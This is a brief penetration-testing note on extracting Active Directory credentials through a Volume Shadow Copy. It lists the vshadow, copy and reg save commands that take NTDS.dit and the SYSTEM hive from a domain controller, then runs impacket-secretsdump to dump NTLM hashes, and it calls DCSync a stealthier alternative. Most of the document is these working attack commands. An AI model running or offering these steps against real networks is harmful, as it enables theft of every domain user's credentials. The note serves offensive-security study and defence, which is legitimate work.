A **Shadow Copy**, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows the *creation of snapshots of files or entire volumes*.

As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.

```cmd
# Note the Shadow copy device name
vshadow.exe -nw -p  C:
-nw: Disable writers (Speeds up backup creation)
-p: Store the copy on disk

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```
```sh
# Get NTLM hashes & kerberos tickets
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

You can perform DCSync Attack which is more stealthy!